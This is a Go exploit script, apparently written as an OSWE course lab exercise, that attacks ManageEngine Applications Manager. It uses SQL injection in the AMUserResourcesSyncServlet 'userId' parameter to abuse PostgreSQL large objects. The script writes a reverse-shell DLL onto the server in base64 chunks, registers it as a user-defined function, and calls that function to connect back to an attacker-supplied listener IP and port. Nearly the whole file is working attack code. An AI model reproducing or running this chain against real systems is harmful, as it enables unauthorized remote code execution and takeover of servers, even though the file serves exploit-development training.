package main

import (
	"crypto/tls"
	"encoding/base64"
	"flag"
	"fmt"
	"github.com/iPhantasmic/OSWE/scripts/utils"
	"io"
	"log"
	"net/http"
	"net/url"
	"os"
	"strings"
)

// Ex 5.8.2.2 - Extra Mile: Dynamic LOID Large Object reverse shell

var client *http.Client

const proxyURL = "http://127.0.0.1:8080"

func createLODynamic(debug bool, ip string) {
	sqli := "1;COPY+(SELECT+lo_import($$C:\\\\windows\\win.ini$$))+to+$$C:\\\\Program+Files+(x86)\\ManageEngine\\AppManager12\\working\\loid.txt$$;--"

	// do necessary URL manipulation
	requestURL := fmt.Sprintf("https://%s:8443/servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=%s", ip, sqli)

	// send the request
	utils.PrintInfo("Creating LO...")
	response := utils.SendGetRequest(client, debug, requestURL)

	if response.StatusCode != 200 {
		utils.PrintFailure("Something went wrong... Check proxy to debug!")
		os.Exit(1)
	}

	utils.PrintSuccess("LO created!")
	fmt.Println("")
}

func getLOID(debug bool, ip string) string {
	requestURL := fmt.Sprintf("https://%s:8443/loid.txt", ip)

	utils.PrintInfo("Retrieving LOID...")
	response := utils.SendGetRequest(client, debug, requestURL)

	if response.StatusCode != 200 {
		utils.PrintFailure("Something went wrong... Check proxy to debug!")
		os.Exit(1)
	}

	loid := strings.TrimSpace(response.ResponseBody)
	utils.PrintSuccess("LOID obtained: " + loid)

	return loid
}

func injectDLLDynamic(debug bool, ip, loid string) {
	stat, err := os.Stat("udf_revshell.dll")
	if err != nil {
		log.Fatalln("Error getting udf_revshell.dll: ", err)
	}

	utils.PrintInfo(fmt.Sprintf("Injecting payload of %d bytes into LO...", stat.Size()))

	file, err := os.Open("udf_revshell.dll")
	if err != nil {
		log.Fatalln("Error reading udf_revshell.dll: ", err)
	}
	defer file.Close()

	buffer := make([]byte, 2048)
	page := 0
	for {
		bytesRead, err := file.Read(buffer)
		if err != nil {
			if err != io.EOF {
				log.Fatalln("Error chunking udf_revshell.dll: ", err)
			}
			break
		}

		var sqli string
		udfChunk := base64.StdEncoding.EncodeToString(buffer)
		if page == 0 {
			sqli = fmt.Sprintf("1;UPDATE PG_LARGEOBJECT SET data=decode($$%s$$, $$base64$$) "+
				"where loid=%s and pageno=%d;--", udfChunk, loid, page)
		} else {
			sqli = fmt.Sprintf("1;INSERT INTO PG_LARGEOBJECT (loid, pageno, data) "+
				"VALUES (%s, %d,decode($$%s$$, $$base64$$));--", loid, page, udfChunk)
		}

		// do necessary URL manipulation
		requestURL := fmt.Sprintf("https://%s:8443/servlet/AMUserResourcesSyncServlet", ip)

		postRequest := utils.PostRequest{
			ContentType: "form",
			FormData: url.Values{
				"ForMasRange": {"1"},
				"userId":      {sqli},
			},
		}

		// send the request
		response := utils.SendPostRequest(client, debug, requestURL, postRequest)

		if response.StatusCode != 200 {
			utils.PrintFailure("Something went wrong... Check proxy to debug!")
			os.Exit(1)
		}

		utils.PrintInfo(fmt.Sprintf("Bytes written to LO: %d", bytesRead))

		page++
	}

	utils.PrintSuccess("UDF DLL injected into LO!")
	fmt.Println("")
}

func exportLODynamic(debug bool, ip, loid string) {
	sqli := fmt.Sprintf("1;SELECT+lo_export(%s,$$C:\\\\Program+Files+(x86)\\ManageEngine\\AppManager12\\working\\rev_shell.dll$$);--", loid)

	// do necessary URL manipulation
	requestURL := fmt.Sprintf("https://%s:8443/servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=%s", ip, sqli)

	// send the request
	utils.PrintInfo("Exporting UDF DLL to filesystem...")
	response := utils.SendGetRequest(client, debug, requestURL)

	if response.StatusCode != 200 {
		utils.PrintFailure("Something went wrong... Check proxy to debug!")
		os.Exit(1)
	}

	utils.PrintSuccess("UDF DLL written to filesystem!")
	fmt.Println("")
}

func createUDFLODynamic(debug bool, ip string) {
	sqli := "1;CREATE OR REPLACE FUNCTION rev_shell(text, integer) " +
		"RETURNS void AS $$C:\\\\Program Files (x86)\\ManageEngine\\AppManager12\\working\\rev_shell.dll$$, " +
		"$$connect_back$$ LANGUAGE C STRICT;--"

	// do necessary URL manipulation
	requestURL := fmt.Sprintf("https://%s:8443/servlet/AMUserResourcesSyncServlet", ip)

	postRequest := utils.PostRequest{
		ContentType: "form",
		FormData: url.Values{
			"ForMasRange": {"1"},
			"userId":      {sqli},
		},
	}

	// send the request
	utils.PrintInfo("Creating UDF...")
	utils.PrintInfo("Sending query: " + sqli)
	response := utils.SendPostRequest(client, debug, requestURL, postRequest)

	if response.StatusCode != 200 {
		utils.PrintFailure("Something went wrong... Check proxy to debug!")
		os.Exit(1)
	}

	utils.PrintSuccess("UDF created!")
	fmt.Println("")
}

func triggerUDFLODynamic(debug bool, ip, listenerIP, listenerPort string) {
	sqli := fmt.Sprintf("1;SELECT rev_shell($$%s$$, %s);--", listenerIP, listenerPort)

	// do necessary URL manipulation
	requestURL := fmt.Sprintf("https://%s:8443/servlet/AMUserResourcesSyncServlet", ip)

	postRequest := utils.PostRequest{
		ContentType: "form",
		FormData: url.Values{
			"ForMasRange": {"1"},
			"userId":      {sqli},
		},
	}

	// send the request
	utils.PrintInfo("Triggering UDF - rev_shell()...")
	utils.PrintInfo("Sending query: " + sqli)
	response := utils.SendPostRequest(client, debug, requestURL, postRequest)

	if response.StatusCode != 200 {
		utils.PrintFailure("Something went wrong... Check proxy to debug!")
		os.Exit(1)
	}

	utils.PrintSuccess("Done... Check listener for reverse shell!")
}

func main() {
	var tr *http.Transport
	useProxy := flag.Bool("proxy", false, "use proxy")
	debug := flag.Bool("debug", false, "debug mode")
	flag.Parse()
	// parse args
	args := os.Args[:]
	log.Println("Args: ", args)

	if len(args) < 4 {
		utils.PrintFailure(fmt.Sprintf("usage: %s [-proxy=<proxyIP>] <target> <listenerIP> <listenerPort>", os.Args[0]))
		utils.PrintFailure(fmt.Sprintf("eg: %s 192.168.121.103 192.168.45.152 1337", os.Args[0]))
		os.Exit(1)
	}

	ip := flag.Arg(0)
	listenerIP := flag.Arg(1)
	listenerPort := flag.Arg(2)

	if *useProxy {
		// disable TLS verification and set proxy URL
		proxyUrl, _ := url.Parse(proxyURL)
		tr = &http.Transport{
			TLSClientConfig:    &tls.Config{InsecureSkipVerify: true},
			DisableCompression: true, // to ensure that we can obtain Content-Length response header
			Proxy:              http.ProxyURL(proxyUrl),
		}
	} else {
		tr = &http.Transport{
			TLSClientConfig:    &tls.Config{InsecureSkipVerify: true},
			DisableCompression: true, // to ensure that we can obtain Content-Length response header
		}
	}

	// create our HTTP client using the above transport and set the global variable
	client = &http.Client{
		Transport: tr,
	}

	createLODynamic(*debug, ip)
	loid := getLOID(*debug, ip)
	injectDLLDynamic(*debug, ip, loid)
	exportLODynamic(*debug, ip, loid)
	createUDFLODynamic(*debug, ip)
	triggerUDFLODynamic(*debug, ip, listenerIP, listenerPort)
}
